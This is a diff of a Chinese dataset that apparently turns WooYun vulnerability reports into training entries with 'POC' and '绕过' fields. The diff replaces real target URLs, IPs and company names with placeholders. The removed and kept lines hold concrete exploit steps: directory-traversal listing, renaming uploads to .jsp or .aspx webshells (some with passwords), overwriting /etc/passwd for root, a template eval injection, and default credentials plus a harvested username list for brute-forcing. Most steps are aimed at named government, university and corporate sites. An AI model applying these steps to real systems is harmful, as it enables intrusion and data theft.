 **绕过**: 直接利用
 
@@ -4558,13 +4558,13 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 信息泄露和权限不严导致列目录及上传以南开大学的为例:http://222.30.60.3/NPELSNPELS_LearningCenter_5.0 客户端下的 Update.exe.config 文件泄露一个重要地址<setting name="Update_CommonSvr_CommonService" serializeAs="String"><value>http://222.30.60.3/NPELS/CommonService.asmx</value></setting>及版本号<add key="TVersion" value="1, 0, 0, 2187"></add>直接访问http://222.30.60.3/NPELS/CommonService.asmx使用GetTestClientFileList操作，直接 HTTP GET 列目录：http://222.30.
+**详情**: 信息泄露和权限不严导致列目录及上传以南开大学的为例:http://[IP已脱敏] 客户端下的 Update.exe.config 文件泄露一个重要地址<setting name="Update_CommonSvr_CommonService" serializeAs="String"><value>http://[IP已脱敏] key="TVersion" value="1, 0, 0, 2187"></add>直接访问http://[IP已脱敏] HTTP GET 列目录：http://222.30.
 
-**POC**: 列目录：http://222.30.60.3/NPELS/CommonService.asmx/GetTestClientFileList?version=../../文件上传：http://222.30.60.3/npelsv/editor/editor.htm上传木马：http://222.30.60.3/npelsv/editor/uploadfiles/1.aspx
+**POC**: 列目录：http://[IP已脱敏]
 
 **绕过**: 直接利用
 
-**修复**: 好像考试系统必须使用 CommonService.asmx最好配置文件加密或者用别的方式不让它泄露出来并且检查或删除各上传入口，像 http://222.30.60.3/NPELS/Upload.aspx 一样
+**修复**: 好像考试系统必须使用 CommonService.asmx最好配置文件加密或者用别的方式不让它泄露出来并且检查或删除各上传入口，像 http://[IP已脱敏] 一样
 ---
 
 ---
@@ -4580,9 +4580,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 福建省国土资源厅存在任意文件直接上传bug上传页面:http://mail.fjgtzy.gov.cn/admin/template/uploadFile.jsp对应后台处理代码public ActionForward execute(ActionMapping mapping, ActionForm form, HttpServletRequest request, HttpServletResponse response){UploadFileForm uploadFileForm = (UploadFileForm)form;String realPath = request.getParameter("realPath");String dir = this.servlet.getServletContext().getRealPath(realPath);FormFile fil
+**详情**: 福建省国土资源厅存在任意文件直接上传bug上传页面:https://example.com/[已脱敏] ActionForward execute(ActionMapping mapping, ActionForm form, HttpServletRequest request, HttpServletResponse response){UploadFileForm uploadFileForm = (UploadFileForm)form;String realPath = request.getParameter("realPath");String dir = this.servlet.getServletContext().getRealPath(realPath);FormFile fil
 
-**POC**: http://mail.fjgtzy.gov.cn/admin/conndb.jspshell是系统权限。简单看了一下，该站点数据库与主机分离，数据库是sa权限，可能直接获得另一台主机（没有测试).数据库连接文件Proxool.properties站点有邮件服务器，http://www.fjgtzy.gov.cn:6080/admin/index.phpwinmail密码admin/evecomtest/testtest123/test123后台简单看一个眼，网上审批？很...该服务器上好像还有很多东西，很多代码，很多数据...不看了，睡觉了，明天早起...
+**POC**: https://example.com/[已脱敏]).数据库连接文件Proxool.properties站点有邮件服务器，https://example.com/[已脱敏]
 
 **绕过**: 直接利用
 
@@ -4602,9 +4602,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 系统名称：东软通用门户软件 UniPortal 1.2漏洞说明：该系统中某页面存在未授权访问，可上传任意文件（包含jsp脚本），秒杀该系统，影响重大，望 CnCert国家互联网应急中心 敦促修复该漏洞。搜索：inurl:ecdomain在百度收集了部分案例如下(远比下面给出的40个案例多的多)：mask 区域1.http://**.**.**/_2.http://**.**.**/_3.http://**.**.**/_4.http://**.**.**/_5.http://**.**.**/_6.http://**.**.**/_7.http://**.**.**/_8.http://**.**.**/_9.http://**.**.**/_10.http://**.**.**/_11.http://**.**.**/_12.http://**.**.**/_13.http://**.*
+**详情**: 系统名称：东软通用门户软件 UniPortal 1.2漏洞说明：该系统中某页面存在未授权访问，可上传任意文件（包含jsp脚本），秒杀该系统，影响重大，望 CnCert国家互联网应急中心 敦促修复该漏洞。搜索：inurl:ecdomain在某搜索引擎收集了部分案例如下(远比下面给出的40个案例多的多)：mask 区域1.http://**.**.**/_2.http://**.**.**/_3.http://**.**.**/_4.http://**.**.**/_5.http://**.**.**/_6.http://**.**.**/_7.http://**.**.**/_8.http://**.**.**/_9.http://**.**.**/_10.http://**.**.**/_11.http://**.**.**/_12.http://**.**.**/_13.http://**.*
 
-**POC**: 漏洞利用：1）问题链接可从 [测试代码] 区域查看。2）上传时，抓包wooyun.jpg 修改为 wooyun.jsp。3）成功后访问 http://website/ecdomain/portal/webpages/web/网站名称/images/文件名称.jsp4）“网站名称”的获取方法为：打开问题链接给出几个上传的成功的案例：1）http://www.mzsi.gov.cn/http://www.mzsi.gov.cn/ecdomain/portal/webpages/web/mzsi/images/wooyun.jsp2）http://www.gslz.lss.gov.cn/http:/
+**POC**: 漏洞利用：1）问题链接可从 [测试代码] 区域查看。2）上传时，抓包wooyun.jpg 修改为 wooyun.jsp。3）成功后访问 http://website/ecdomain/portal/webpages/web/网站名称/images/文件名称.jsp4）“网站名称”的获取方法为：打开问题链接给出几个上传的成功的案例：1）https://example.com/[已脱敏]
 
 **绕过**: 直接利用
 
@@ -4612,7 +4612,7 @@
 ---
 
 ---
-### [wooyun-2015-0107735] 中国电信号码百事通分站配置不当致文件上传漏洞
+### [wooyun-2015-0107735] 某运营商号码百事通分站配置不当致文件上传漏洞
 **厂商**: 189.cn | **年份**: 2015 | **类型**: 文件上传导致任意代码执行
 
 **元思考**: 触发信号: 上传功能
@@ -4624,9 +4624,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: http://lbs.189.cn/kindeditor/php/file_manager_json.php?path=/泄露绝对路径等信息http://lbs.189.cn/kindeditor/php/demo.phphttp://lbs.189.cn/kindeditor/php/upload_json.php?dir=file 可以post上传文件查看kindeditor的upload_json.ashx源代码，允许上传的文件:本地上传表单:<form action='http://lbs.189.cn/kindeditor/php/upload_json.php?dir=file' enctype="multipart/form-data" method="post"><input type="file" name="imgFile"><input type="submit"><
+**详情**: https://example.com/[已脱敏] 可以post上传文件查看kindeditor的upload_json.ashx源代码，允许上传的文件:本地上传表单:<form action='https://example.com/[已脱敏]' enctype="multipart/form-data" method="post"><input type="file" name="imgFile"><input type="submit"><
 
-**POC**: http://lbs.189.cn/kindeditor/php/file_manager_json.php?path=/泄露绝对路径等信息http://lbs.189.cn/kindeditor/php/demo.phphttp://lbs.189.cn/kindeditor/php/upload_json.php?dir=file 可以post上传文件上传成功：结果：
+**POC**: https://example.com/[已脱敏] 可以post上传文件上传成功：结果：
 
 **绕过**: 直接利用
 
@@ -4646,7 +4646,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 上传地址 http://www.93yin.com/index.php?r=default/photo/zpbc&id=27截断上传由于不解析php并且是linux，所以换一下大小写就行了
+**详情**: 上传地址 https://example.com/[已脱敏]
 
 **POC**: (见原文)
 
@@ -4668,7 +4668,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 首先后台上下：http://jxgl.fimmu.com/admin/Admin_Login.asphttp://jxgl.fimmu.com/Database/SiteWeaver.mdb动易CMS的扫了下发现很多数据库地址下载试试看还有很多文件就不多说了另外还存在http://jxgl.fimmu.com/jwc/user/Upload.asp?dialogtype=UserBlogPic&size=5文件上传注册会员之后登陆，文件上传这个你们应该比我懂
+**详情**: 首先后台上下：https://example.com/[已脱敏]
 
 **POC**: 看详细说明
 
@@ -4690,7 +4690,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 案例：https://58.42.250.234/https://www.lngmxx.com/https://60.13.3.21/https://120.195.49.238/https://124.163.249.126/这里以www.lngmxx.com为例默认账户密码都是admin登陆进来之后，在系统——配置文件——Flash空间管理 上传文件如图：抓包，修改filename为../../../etc/passwd可覆盖/etc/passwd这个文件通过之前的任意文件下载漏洞，我们可以获取到系统本身的/etc/passwd文件，下载下来，然后将admin那一行改成admin:x:0:0::/home/admin:/bin/bash这样，我们通过admin登陆ssh，就变成了root权限了
+**详情**: 案例：https://[IP已脱敏] 上传文件如图：抓包，修改filename为../../../etc/passwd可覆盖/etc/passwd这个文件通过之前的任意文件下载漏洞，我们可以获取到系统本身的/etc/passwd文件，下载下来，然后将admin那一行改成admin:x:0:0::/home/admin:/bin/bash这样，我们通过admin登陆ssh，就变成了root权限了
 
 **POC**: (见原文)
 
@@ -4736,7 +4736,7 @@
 
 **详情**: 58同城网允许任意用户注册,注册后登陆个人中心在修改资料上传头像处存在上传未过滤后缀问题,包含Gif89a头的文件格式均可上传!
 
-**POC**: http://pic.58.com/m1/bigimage/n_9266907643652.asp
+**POC**: https://example.com/[已脱敏]
 
 **绕过**: 直接利用
 
@@ -4756,7 +4756,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: http://www.yinyuetai.com/fckeditor/editor/filemanager/connectors/test.htmlfck的test页面未删除 已成灾荒嘿嘿
+**详情**: https://example.com/[已脱敏] 已成灾荒嘿嘿
 
 **POC**: (见原文)
 
@@ -4778,7 +4778,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 官方：http://www.xpshop.cn官方demo站：http://enframe.xpshop.cn/用户中心，添加场景。直接上传任意格式文件,上传一句话
+**详情**: 官方：https://example.com/[已脱敏]
 
 **POC**: RS
 
@@ -4800,9 +4800,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: http://ecshub.foxconn.com/System/RegistUser/RegistUserEdit.aspx?billno=USG201510300001
+**详情**: https://example.com/[已脱敏]
 
-**POC**: http://ecshub.foxconn.com/1.aspx密码admin好多服务器密码和接口地址。
+**POC**: https://example.com/[已脱敏]
 
 **绕过**: 直接利用
 
@@ -4822,9 +4822,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: http://learning.ufh.com.cnhttp://learning.ufh.com.cn/fckeditor/editor/filemanager/browser/default/connectors/jsp/connector?Command=GetFoldersAndFiles&Type=Image&CurrentFolder=/../../../
+**详情**: https://example.com/[已脱敏]
 
-**POC**: 配置信息泄漏http://learning.ufh.com.cn/CVS/Entrieshttp://learning.ufh.com.cn/adm/CVS/Entries文件上传http://learning.ufh.com.cn/fckeditor/editor/filemanager/browser/default/browser.html?Connector=connectors/jsp/connectorPOST http://learning.ufh.com.cn/fckeditor/editor/filemanager/browser/default/connectors/jsp
+**POC**: 配置信息泄漏https://example.com/[已脱敏] https://example.com/[已脱敏]
 
 **绕过**: 直接利用
 
@@ -4844,7 +4844,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 麻烦给个邀请码！   我都投了好几次了 拜托了大哥！漏洞链接http://www1.scst.gov.cn:90/Tech_Contract/BackDoor/SpecialColumn.aspxhttp://www1.scst.gov.cn:90/Tech_Contract/BackDoor/VideoCtl.aspxhttp://www1.scst.gov.cn:90/Tech_Contract/BackDoor/pg_left.aspx
+**详情**: 麻烦给个邀请码！   我都投了好几次了 拜托了大哥！漏洞链接https://example.com/[已脱敏]
 
 **POC**: (见原文)
 
@@ -4866,9 +4866,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: WooYun: 美的官方某分站上传漏洞有人提交过，不知道你们是没有修复还是没有修复好http://202.104.30.185/fckeditor/editor/fckeditor.html直接上传一个jsp格式的木马菜刀马 http://202.104.30.185//UserFiles/Image/yjh.jsp 密码 xiaomaroot权限
+**详情**: WooYun: 美的官方某分站上传漏洞有人提交过，不知道你们是没有修复还是没有修复好http://[IP已脱敏] http://[IP已脱敏] 密码 xiaomaroot权限
 
-**POC**: WooYun: 美的官方某分站上传漏洞有人提交过，不知道你们是没有修复还是没有修复好http://202.104.30.185/fckeditor/editor/fckeditor.html直接上传一个jsp格式的木马菜刀马 http://202.104.30.185//UserFiles/Image/yjh.jsp 密码 xiaomaroot权限
+**POC**: WooYun: 美的官方某分站上传漏洞有人提交过，不知道你们是没有修复还是没有修复好http://[IP已脱敏] http://[IP已脱敏] 密码 xiaomaroot权限
 
 **绕过**: 直接利用
 
@@ -4888,7 +4888,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 通用性漏洞,随便在百度上搜了几个http://cm.justwin.cn/http://www.xcrzkj.com/http://www.bbczcvnt.com/http://www.bociamc.com.cn/http://www.dmjtzs.com/http://114.242.206.5/http://113.31.17.184/由于使用了fckeditor编辑器，导致上传没有任何过滤，可以上传任意文件，拿其中一个站演示如下：
+**详情**: 通用性漏洞,随便在某搜索引擎上搜了几个https://example.com/[已脱敏]
 
 **POC**: (见原文)
 
@@ -4910,7 +4910,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 这么多弱口令 也花了挺多时间  求上个首页  T_T问题出在你们的oa系统漏洞地址：http://newoa.glsc.com.cn:8082/但是审核大大您看清楚了我提交的这个跟WooYun: 国联证券某安全隐患导致可登陆多个系统（员工手机邮箱/内部文档/可找回密码/任意文件上传）不是同一个漏洞 他提交的弱口令是 123456而我找到了他们其他的弱口令我先用密码 a123456爆出一个用户，然后利用该用户导出他们的通讯录以下是通讯录+top500，后面爆破要用(可能有重复，这些都是邮箱名)：jiangzqchenklzhuqhengyqcaoxtyiqxuzbwujjwangwzhoucmwushengxuwzhangjfwanggjzhangfanzhaowywangtsmohyzhangyitangyunzhangliangrenphuanghaofengkjhouhbchenjji
+**详情**: 这么多弱口令 也花了挺多时间  求上个首页  T_T问题出在你们的oa系统漏洞地址：https://example.com/[已脱敏] 国联证券某安全隐患导致可登陆多个系统（员工手机邮箱/内部文档/可找回密码/任意文件上传）不是同一个漏洞 他提交的弱口令是 123456而我找到了他们其他的弱口令我先用密码 a123456爆出一个用户，然后利用该用户导出他们的通讯录以下是通讯录+top500，后面爆破要用(可能有重复，这些都是邮箱名)：jiangzqchenklzhuqhengyqcaoxtyiqxuzbwujjwangwzhoucmwushengxuwzhangjfwanggjzhangfanzhaowywangtsmohyzhangyitangyunzhangliangrenphuanghaofengkjhouhbchenjji
 
 **POC**: 证明：
 
@@ -4932,9 +4932,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 中国铁建多站漏洞集合#SQL注射+文件上传。1.SQL注射。注入地址：http://www.cr23g.com/jtdt_dc.asp?id=82922，上传地址：http://www.cr12ja.com/htmledit/popup.asp
+**详情**: 中国铁建多站漏洞集合#SQL注射+文件上传。1.SQL注射。注入地址：https://example.com/[已脱敏]
 
-**POC**: 中国铁建多站漏洞集合#SQL注射+文件上传。1.SQL注射。注入地址：http://www.cr23g.com/jtdt_dc.asp?id=82922，上传地址：http://www.cr12ja.com/htmledit/popup.asp
+**POC**: 中国铁建多站漏洞集合#SQL注射+文件上传。1.SQL注射。注入地址：https://example.com/[已脱敏]
 
 **绕过**: 直接利用
 
@@ -4956,7 +4956,7 @@
 
 **详情**: ..........
 
-**POC**: Target: 		http://www.jxakzx.com/notices.jsp?keyno=14Host IP:		103.28.204.112Web Server: 	Apache/2.2.2 (Win32) mod_jk/1.2.18DB Server: 	MySQL >=5Resp. Time(avg):	606 msCurrent User: 	jxak@localhostSql Version: 	5.5.19Current DB: 	jxakSystem User: 	jxak@localhostHost Name: 	bbdx-5961d93ea4Installation
+**POC**: Target: 		https://example.com/[已脱敏] IP:		[IP已脱敏]Web Server: 	Apache/2.2.2 (Win32) mod_jk/1.2.18DB Server: 	MySQL >=5Resp. Time(avg):	606 msCurrent User: 	jxak@localhostSql Version: 	5.5.19Current DB: 	jxakSystem User: 	jxak@localhostHost Name: 	bbdx-5961d93ea4Installation
 
 **绕过**: 直接利用
 
@@ -4976,9 +4976,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: http://www.crucco.com/huodongye.php?pn=zucefangsi在这里我们发现pn的值没有指定，可以任意提交，我们推断应该程序员写成以下代码$smarty->display($_GET['p']);我们找到ecshop中的 display方法 发现里面用了evalfunction _eval($content){ob_start();eval('?' . '>' . trim($content));$content = ob_get_contents();ob_end_clean();return $content;}
+**详情**: https://example.com/[已脱敏]'p']);我们找到ecshop中的 display方法 发现里面用了evalfunction _eval($content){ob_start();eval('?' . '>' . trim($content));$content = ob_get_contents();ob_end_clean();return $content;}
 
-**POC**: 我们提交以下url:http://www.crucco.com/huodongye.php?pn=str:%3C?php%20phpinfo%28%29;//会发现可爱的phpinfo出来了
+**POC**: 我们提交以下url:https://example.com/[已脱敏]
 
 **绕过**: 直接利用
 
@@ -5020,7 +5020,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 在主站登录进去，上传图片处：截断，然后重放：注意参数imagePathFormat这儿可以直接控制上传目录，但是当我改成文件的时候，直接就会生成文件哦。我们访问：http://www.nagain.com/media/index.html
+**详情**: 在主站登录进去，上传图片处：截断，然后重放：注意参数imagePathFormat这儿可以直接控制上传目录，但是当我改成文件的时候，直接就会生成文件哦。我们访问：https://example.com/[已脱敏]
 
 **POC**: 哦耶，中招。
 
@@ -5066,7 +5066,7 @@
 
 **详情**: 漏洞地址:www.域名/thirdparty/fckeditor/editor/filemanager/browser/default/browser.html?Type=Image&Connector=connectors/jsp/connector.jsp
 
-**POC**: 使用JEECMS系统的网站FCK漏洞地址：1、中国物流信息中心：http://www.clic.org.cn/http://www.clic.org.cn/thirdparty/fckeditor/editor/filemanager/browser/default/browser.html?Type=Image&Connector=connectors/jsp/connector.jsp2、黑龙江发展改革委员会： http://www.hljdpc.gov.cn/http://www.hljdpc.gov.cn/thirdparty/fckeditor/editor/filemanager/
+**POC**: 使用JEECMS系统的网站FCK漏洞地址：1、中国物流信息中心：https://example.com/[已脱敏] https://example.com/[已脱敏]
 
 **绕过**: 直接利用
 
@@ -5086,7 +5086,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: http://youth.mfa.gov.cn/twnew/twnew_w/cfly/edit/upload.aspx?n=1110137649 这里的上传可以任意上传脚本后缀
+**详情**: https://example.com/[已脱敏] 这里的上传可以任意上传脚本后缀
 
 **POC**: (见原文)
 
@@ -5130,7 +5130,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 公司主站有员工的办公系统，url：http://www.8telecom.cn/OA/login.php 。没有验证码，根据搜到的网站邮箱用户名，进行暴力破解，如 tangxianpeng 密码888888  。进入后，发表文章时，附件出可以直接上传php文件。不过服务器的权限设置的挺好， 本人也没有继续下去，水平有限。
+**详情**: 公司主站有员工的办公系统，url：https://example.com/[已脱敏] 。没有验证码，根据搜到的网站邮箱用户名，进行暴力破解，如 tangxianpeng 密码888888  。进入后，发表文章时，附件出可以直接上传php文件。不过服务器的权限设置的挺好， 本人也没有继续下去，水平有限。
 
 **POC**: 前台登陆地址：进入系统后，可以看到一些红头文件
 
@@ -5152,7 +5152,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 不玩了 下午把你的网站差点玩坏了 经常404我就来提交了先来注册个帐号这里是上传地址：http://www.yifutu.com/zbfzzdyxuqiu.html?fdsTid=35714上传是jpg用burp改成aspx第二个包略过到第三个包再一次提交 马的地址就出来了然后菜刀连上服务器里面有100多站主站点到即止
+**详情**: 不玩了 下午把你的网站差点玩坏了 经常404我就来提交了先来注册个帐号这里是上传地址：https://example.com/[已脱敏] 马的地址就出来了然后菜刀连上服务器里面有100多站主站点到即止
 
 **POC**: (见原文)
 
@@ -5174,7 +5174,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 上传页面，上传任意文件！！http://wszw.hzs.mofcom.gov.cn/fecp/portalpubsys/jbhtmledit/dlg_insert_media.jsp漏洞页面
+**详情**: 上传页面，上传任意文件！！https://example.com/[已脱敏]
 
 **POC**: -  - 小菜技术不够，不然搞到数据库应该会更好玩~有个OA~~
 
@@ -5218,7 +5218,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: http://ee403.hit.edu.cn/database.rar某天找漏洞，本来想找个文件上传漏洞。居然看到直接有个database.rar,可能是某次备份忘了设置权限吧，直接放在根目录了。下载了放在SQL Server里面打开。admin表：还有500多哈工大的注册用户
+**详情**: https://example.com/[已脱敏] Server里面打开。admin表：还有500多哈工大的注册用户
 
 **POC**: (见原文)
 
@@ -5250,8 +5250,8 @@
 ---
 
 ---
-### [wooyun-2012-05563] 中国移动mas2.0平台系统漏洞
-**厂商**: 中国移动 | **年份**: 2012 | **类型**: 设计缺陷/逻辑错误
+### [wooyun-2012-05563] 某运营商mas2.0平台系统漏洞
+**厂商**: 某运营商 | **年份**: 2012 | **类型**: 设计缺陷/逻辑错误
 
 **元思考**: 触发信号: 认证接口, 上传功能, 后台管理
 
@@ -5262,7 +5262,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 一、产品说明MAS是中国移动的短信代理网关（平台）。MAS是Mobile Agent Server的简称。目前多个政府部门、国有大型企业部门、运营商、金融部门都采用该平台。MAS2.0是中国新一代的代理网关系统。二、漏洞细节1、后台验证绕过漏洞后台管理页面对session赋值存在逻辑错误，使得攻击者在登陆页面输入错误账户后可以得到一个返回true的session值，此时可以直接访问后台页面，可以获取敏感资料和发送短信（厅级领导个人电话，或者发送欺骗短信）。测试步骤：a、访问登陆页面http://x.x.x.x/logon.jsp输入任意账户，登陆。b、直接访问http://x.x.x.x/left.jsp2、文件上传部门mas平台存在通信录和彩信图片上传界面，可以通过截断和本地提交方式上传jsp文件。（不通用，仅测试了一个，部分mas2.0不存在上传页面）。三、修复建议1、对后台文件进行权
+**详情**: 一、产品说明MAS是某运营商的短信代理网关（平台）。MAS是Mobile Agent Server的简称。目前多个政府部门、国有大型企业部门、运营商、金融部门都采用该平台。MAS2.0是中国新一代的代理网关系统。二、漏洞细节1、后台验证绕过漏洞后台管理页面对session赋值存在逻辑错误，使得攻击者在登陆页面输入错误账户后可以得到一个返回true的session值，此时可以直接访问后台页面，可以获取敏感资料和发送短信（厅级领导个人电话，或者发送欺骗短信）。测试步骤：a、访问登陆页面http://x.x.x.x/logon.jsp输入任意账户，登陆。b、直接访问http://x.x.x.x/left.jsp2、文件上传部门mas平台存在通信录和彩信图片上传界面，可以通过截断和本地提交方式上传jsp文件。（不通用，仅测试了一个，部分mas2.0不存在上传页面）。三、修复建议1、对后台文件进行权
 
 **POC**: (见原文)
 
@@ -5284,7 +5284,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: http://www.zqgtzy.gov.cn/cmshttps://wooyun-img.oss-cn-beijing.aliyuncs.com/upload/fjsc.jsp?filePath=cms-uploadfiles-download&isfn=1&ischeck=1&fileType=.jpg,.bmp,.gif,.rar,.zip,.doc,.jsp,.wps
+**详情**: https://example.com/[已脱敏]
 
 **POC**: (见原文)
 
@@ -5306,7 +5306,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 基于上次发的已经很详细了 这次就简要描述下:http://www1.customs.gov.cn/tabid/47316/ctl/Edit/mid/118574/InfoID/378661/Default.aspx权限限制不严啊``上传asp;.jpg之类的``然后就OK了提权 渗透``不是什么难事``我懒 嘻嘻C段都是海关的信息系统啊``
+**详情**: 基于上次发的已经很详细了 这次就简要描述下:https://example.com/[已脱敏]``上传asp;.jpg之类的``然后就OK了提权 渗透``不是什么难事``我懒 嘻嘻C段都是海关的信息系统啊``
 
 **POC**: 数据库什么的`
 
@@ -5328,9 +5328,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: WooYun: 某通用型在线学习管理系统存在任意文件上传及任意文件下载漏洞,WooYun: 某通用型在线学习管理系统存在任意文件上传漏洞（另一种奇葩姿势）用友的e-Learning，wefgod大牛提交过，这里摘取一下他之前提供的弱口令：首先需要一个低权限账号登录（反正没有验证码，设定好简单密码，按数字直接丢去暴了都没有问题）给出几个默认或简单密码的：http://58.214.233.113:8800/lmsv5/00041013/12345600041014/123456http://60.216.4.162:9091/lmsv5/107648/111111107640/111111
+**详情**: WooYun: 某通用型在线学习管理系统存在任意文件上传及任意文件下载漏洞,WooYun: 某通用型在线学习管理系统存在任意文件上传漏洞（另一种奇葩姿势）用友的e-Learning，wefgod大牛提交过，这里摘取一下他之前提供的弱口令：首先需要一个低权限账号登录（反正没有验证码，设定好简单密码，按数字直接丢去暴了都没有问题）给出几个默认或简单密码的：http://[IP已脱敏]
 
-**POC**: http://58.214.233.113:8800/lmsv5/ 为例，通过在我的信息-修改信息的时候，发现了这么一个GET请求:Request URL:http://58.214.233.113:8800/lmsv5/user!editUserInfo.action?IA_USERID=38766Request Method:GETStatus Code:200 OK修改此处的A_USERID可以实现遍历他人信息，包括（用户名，邮件地址，手机号码，固定电话，证件号码，地址，昵称）仅此站点，通过简单的测试，从IA_USERID1-38766用户中统计出了18911有填写用户信息的用户，在提交
+**POC**: http://[IP已脱敏] 为例，通过在我的信息-修改信息的时候，发现了这么一个GET请求:Request URL:http://[IP已脱敏] Method:GETStatus Code:200 OK修改此处的A_USERID可以实现遍历他人信息，包括（用户名，邮件地址，手机号码，固定电话，证件号码，地址，昵称）仅此站点，通过简单的测试，从IA_USERID1-38766用户中统计出了18911有填写用户信息的用户，在提交
 
 **绕过**: 直接利用
 
@@ -5350,7 +5350,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: http://jwxt.gdufe.edu.cn/(S(tvucbvssw1ku22lnfruatehm))/default2.aspxhttp://jwxt.gdufe.edu.cn/(S(tvucbvssw1ku22lnfruatehm))//fckeditor/editor/filemanager/browser/default/browser.html?&connector=../../connectors/aspx/connector.aspx地址 fck2.6.6
+**详情**: https://example.com/[已脱敏]))/default2.aspxhttps://example.com/[已脱敏]))//fckeditor/editor/filemanager/browser/default/browser.html?&connector=../../connectors/aspx/connector.aspx地址 fck2.6.6
 
 **POC**: (见原文)
 
@@ -5372,7 +5372,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 江民病毒上报分站上传处过滤不严，服务器配置不当，造成可以上传asp木马。分站：http://virusup.jiangmin.com/没有对上传路径进行过滤，IIS6解释漏洞。具体看图吧。http://virusup.jiangmin.com/uploadfile/virusup/diy.asp/20120428221403412.zip（ps:只上传了，也没做什么，也不知那服务器重不重要，马还没删除，你们处理下吧!）
+**详情**: 江民病毒上报分站上传处过滤不严，服务器配置不当，造成可以上传asp木马。分站：https://example.com/[已脱敏]
 
 **POC**: (见原文)
 
@@ -5382,8 +5382,8 @@
 ---
 
 ---
-### [wooyun-2012-016093] 利用上传成功进入腾讯某站
-**厂商**: 腾讯 | **年份**: 2012 | **类型**: 文件上传导致任意代码执行
+### [wooyun-2012-016093] 利用上传成功进入某互联网公司某站
+**厂商**: 某互联网公司 | **年份**: 2012 | **类型**: 文件上传导致任意代码执行
 
 **元思考**: 触发信号: 上传功能
 
@@ -5394,7 +5394,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 在上传页面上传文件之后可以通过抓包修改上传文件名称来绕过验证,从而导致可上传动态脚本。PS：碰到真是运气....不知道企鹅多少漏洞之后送娃娃http://fenxiang.qq.comhttps://wooyun-img.oss-cn-beijing.aliyuncs.com/upload/index.phphttps://wooyun-img.oss-cn-beijing.aliyuncs.com/upload/user/apply 漏洞页面http://fenxiang.qq.comhttps://wooyun-img.oss-cn-beijing.aliyuncs.com/upload/uploads/1355631395_yijuhua.php 一句话
+**详情**: 在上传页面上传文件之后可以通过抓包修改上传文件名称来绕过验证,从而导致可上传动态脚本。PS：碰到真是运气....不知道企鹅多少漏洞之后送娃娃https://example.com/[已脱敏] 漏洞页面https://example.com/[已脱敏] 一句话
 
 **POC**: (见原文)
 
@@ -5416,7 +5416,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: http://gzcxw.nmjt.gov.cn:9080/cdsxxporxxx/http://gzcxw.nmjt.gov.cn:9080/cdsxxporxxx/UserFiles/Image/test/no.jsphttp://gzcxw.nmjt.gov.cn:9080/cdsxxporxxx/baseControl/js/editor/FCKeditor/editor//filemanager/browser/default/browser.html?Type=&Connector=connectors/jsp/connectorhttp://gzcxw.nmjt.gov.cn:9080/cdsxxporxxx/baseControl/截图说明。。
+**详情**: https://example.com/[已脱敏]
 
 **POC**: (见原文)
 
@@ -5438,9 +5438,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 之前看到有人找到一个任意上传的漏洞。所以看了一下。不知道是否和他的一致地址WooYun: ThinkSNS 2.8 上传任意文件漏洞代码产生位置apps\wap\Lib\Action\IndexAction.class.php263行if(!empty($_FILES['pic']['name'])) { // 自动发一条图片微博$data['pic']      = $_FILES['pic'];$data['content']  = '图片分享';$data['from']     = $this->_type_wap;$res = api('Statuses')->data($data)->upload();}未对文件类型过滤
+**详情**: 之前看到有人找到一个任意上传的漏洞。所以看了一下。不知道是否和他的一致地址WooYun: ThinkSNS 2.8 上传任意文件漏洞代码产生位置apps\wap\Lib\Action\IndexAction.class.php263行if(!empty($_FILES['pic']['name'])) { // 自动发一条图片某社交平台$data['pic']      = $_FILES['pic'];$data['content']  = '图片分享';$data['from']     = $this->_type_wap;$res = api('Statuses')->data($data)->upload();}未对文件类型过滤
 
-**POC**: 访问wap 模块发一条微博并传图firebug 地址去掉small_然后访问http://================/data/uploads/2012/1023/17/50865d481c217.php
+**POC**: 访问wap 模块发一条某社交平台并传图firebug 地址去掉small_然后访问http://================/data/uploads/2012/1023/17/50865d481c217.php
 
 **绕过**: 直接利用
 
@@ -5504,7 +5504,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 上传地址http://365net.tw/about/up/upload_flash.asp?formname=myform&editname=picpath1&uppath=uploadpic&filelx=jpg典型的具有上传漏洞的链接地址操Burp上传asp木马上去一看，早就被蹂躏拉
+**详情**: 上传地址https://example.com/[已脱敏]
 
 **POC**: (见原文)
 
@@ -5526,7 +5526,7 @@
 2. 构造测试Payload
